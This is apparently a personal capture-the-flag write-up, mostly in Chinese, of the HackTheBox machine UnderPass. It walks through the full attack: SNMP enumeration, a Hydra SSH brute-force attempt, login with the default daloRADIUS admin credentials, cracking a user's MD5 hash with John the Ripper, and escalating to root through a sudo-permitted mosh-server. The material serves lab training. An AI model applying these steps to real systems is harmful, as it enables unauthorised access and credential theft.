---
title: 'HackTheBox: UnderPass'
disqus: hackmd
---

HackTheBox: UnderPass
===

## Topic

### Lab
- HackTheBox: \
https://app.hackthebox.com/machines/UnderPass

### Initial Enumeration

● Start Machine: `10.10.11.48`\
![image](https://hackmd.io/_uploads/SJISM6QAJe.png)

```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -Pn 10.10.11.48 
Nmap scan report for 10.10.11.48
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 625.00 seconds
```
> SSH, HTTP

瀏覽 http://10.10.11.48/
![image](https://hackmd.io/_uploads/BJqAtTmC1l.png)

- dirb
```
┌──(chw㉿CHW)-[~]
└─$ dirb http://10.10.11.48/    
...

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.11.48/ ----
+ http://10.10.11.48/index.html (CODE:200|SIZE:10671)                                               
+ http://10.10.11.48/server-status (CODE:403|SIZE:276)                                              
            
-----------------
END_TIME: Wed Apr  9 11:02:03 2025
DOWNLOADED: 4612 - FOUND: 2

```
> 沒有可用資訊

- nmap UDP port
```
┌──(chw㉿CHW)-[~]
└─$ nmap -sU --script snmp-info 10.10.11.48
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 04:24 EDT
Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 4.70% done; ETC: 04:37 (0:12:30 remaining)
Stats: 0:05:49 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 33.98% done; ETC: 04:41 (0:11:18 remaining)
Stats: 0:11:36 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 63.83% done; ETC: 04:42 (0:06:35 remaining)
Nmap scan report for 10.10.11.48
Host is up (0.24s latency).
Not shown: 997 closed udp ports (port-unreach)
PORT     STATE         SERVICE
161/udp  open          snmp
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 31
|_  snmpEngineTime: 59m55s
1812/udp open|filtered radius
1813/udp open|filtered radacct
```
> SNMP 161 port


## Solution

### 1. SNMP
#### 1.1 onesixtyone
利用 onesixtyone 搜尋 community string
```
┌──(chw㉿CHW)-[/usr/share/seclists/Discovery/SNMP]
└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.10.11.48

Scanning 1 hosts, 3218 communities
10.10.11.48 [public] Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
10.10.11.48 [public] Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64

```
> community string: `public`
#### 1.2 snmpbulkwalk
透過 snmpbulkwalk 查詢 snmp 設備
```
┌──(chw㉿CHW)-[~]
└─$ snmpbulkwalk -c public -v2c 10.10.11.48
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (1296794) 3:36:07.94
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (1297902) 3:36:19.02
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 04 0B 07 28 3A 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 5
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 233
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

```
> `steve@underpass.htb`: 可能是 user\
> `UnDerPass.htb is the only daloradius server in the basin!` : UnDerPass.htb domain
>> http://underpass.htb/daloradius/ \
>> ![image](https://hackmd.io/_uploads/SJ4RY8UCye.png)

>[!Note]
>1. `1.3.6.1.2.1.1.*`→ System MIB
>- `1.3.6.1.2.1.1.1.0`:	系統描述：Linux 主機版本、核心版本（5.15.0-126）
>- `1.3.6.1.2.1.1.2.0`:	主機支援的 SNMP MIB 模組 OID（識別對應的設備）
>- `1.3.6.1.2.1.1.3.0`:	SNMP agent 開機時間（TimeTicks）
>- `1.3.6.1.2.1.1.4.0`:	聯絡人資訊
>- `1.3.6.1.2.1.1.5.0`:	主機名稱
>- `1.3.6.1.2.1.1.6.0`:	位置資訊（可自定）
>- `1.3.6.1.2.1.1.7.0`:	SNMP 支援的功能類型
>- `1.3.6.1.2.1.1.9.*`: 支援的 SNMP MIB 模組
>2. `1.3.6.1.2.1.25.*` → Host Resources MIB
>- `25.1.1.0`:	SNMP 的 agent uptime
>- `25.1.2.0`:	系統日期（Hex 格式）
>- `25.1.3.0`:	系統 RAM 大小（以 KB 計）
>- `25.1.4.0`:	開機引數（Linux 開機參數）→ /vmlinuz... root=/dev/mapper/...
>- `25.1.5.0`:	可同時登入的使用者數限制（5）
>- `25.1.6.0`:	當前已登入的使用者數（233）⚠️ 可能不準
>- `25.1.7.0`:	系統正在執行的作業模式（通常 0 表示 normal）`

#### 1.3 `/etc/hosts`
將 UnDerPass.htb 加入 `/etc/hosts`
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/hosts
10.10.11.48     UnDerPass.htb
```
### 2. Hydra SSH
Hydra 嘗試爆破 steve SSH
```
┌──(chw㉿CHW)-[~]
└─$ hydra -l steve -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.48
...
```
> 天路地老

### 3. daloradius
[daloRADIUS](https://github.com/lirantal/daloradius) 是管理 RADIUS 的工具。

在 [rakibulinux/FreeRADIUS-daloRADIUS.sh](https://gist.github.com/rakibulinux/ff0bb12e5c75167f4b3d7486f57acf23) 提到預設路徑與密碼：
> `http://localhost/daloradius/app/operators/login.php`\
Username: `administrator`\
Password: `radius`

瀏覽 http://underpass.htb/daloradius/app/operators/login.php \
![image](https://hackmd.io/_uploads/rkfMXvURJe.png)

嘗試登入：
http://underpass.htb/daloradius/app/operators/home-main.php\
![image](https://hackmd.io/_uploads/HkPH7DURkg.png)
> 成功登入，瀏覽功能
#### 3.1 List User
在 Management > List Users 中發現 Username & Password:\
http://underpass.htb/daloradius/app/operators/mng-list-all.php \
![image](https://hackmd.io/_uploads/Hy63QwIRke.png)
> `svcMosh`: `412DD4759978ACFCC81DEAB01B382403`

### 4. JtH
將 Hash 儲存成 `daloradius.hash`
```
┌──(chw㉿CHW)-[~]
└─$ cat daloradius.hash 
412DD4759978ACFCC81DEAB01B382403

┌──(chw㉿CHW)-[~]
└─$ john daloradius.hash --wordlist=/usr/share/wordlists/rockyou.txt

Warning: detected hash type "LM", but the string is also recognized as "dynamic=md5($p)"
Use the "--format=dynamic=md5($p)" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "HAVAL-128-4"
Use the "--format=HAVAL-128-4" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "lotus5"
Use the "--format=lotus5" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "mscash"
Use the "--format=mscash" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "mscash2"
Use the "--format=mscash2" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "NT"
...
```
> 最有可能的 Hash: `MD5`

使用 MD5 format 爆破：
```
┌──(chw㉿CHW)-[~]
└─$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt daloradius.hash

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 ASIMD 4x2])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
underwaterfriends (?)     
1g 0:00:00:00 DONE (2025-04-11 05:46) 4.545g/s 13563Kp/s 13563Kc/s 13563KC/s unicorn188..undertaker2310
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
> `svcMosh`: `underwaterfriends`

### 5. 嘗試登入 SSH
```
┌──(chw㉿CHW)-[~]
└─$ ssh svcMosh@10.10.11.48
svcMosh@10.10.11.48's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
...

Last login: Fri Apr 11 09:04:28 2025 from 127.0.0.1
svcMosh@underpass:~$ pwd
/home/svcMosh
svcMosh@underpass:~$ hostname
underpass
```

### ✅ Get User Flag
> 在 `/home/svcMosh` 找到 User flag

## Privileges Escalation

### 6. Sudo -l
```
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```
> `/usr/bin/mosh-server`

### 7. mosh-server
GTFOBins 查無 mosh-server提權方式\
Google search: `mosh server priv escalation`\
參考：[mosh-server sudo privilege escalation](https://medium.com/@momo334678/mosh-server-sudo-privilege-escalation-82ef833bb246)

#### 7.1 SSH 啟動 mosh-server
```
svcMosh@underpass:~$ sudo /usr/bin/mosh-server


MOSH CONNECT 60001 EiA6WQ5NfcGBgwqzKuz7eA

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 8618]

```
> UDP port: `60001`
> Session Key: `EiA6WQ5NfcGBgwqzKuz7eA`

#### 7.2 Kali 連線 mosh-server
```
┌──(chw㉿CHW)-[~]
└─$ MOSH_KEY=EiA6WQ5NfcGBgwqzKuz7eA mosh-client 10.10.11.48 60001
..
mosh: Last contact 1:38 ago. [To quit: Ctrl-^ .]

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Apr 11 09:54:27 AM UTC 2025

  System load:  0.02              Processes:             225
  Usage of /:   53.9% of 6.56GB   Users logged in:       0
  Memory usage: 13%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



root@underpass:~# whoami
root
root@underpass:~# ls
```
> 成功提權

### ✅ Get Root FLAG
![image](https://hackmd.io/_uploads/SyElqPI0Jl.png)


###### tags: `HTB` `Web` `CTF` 
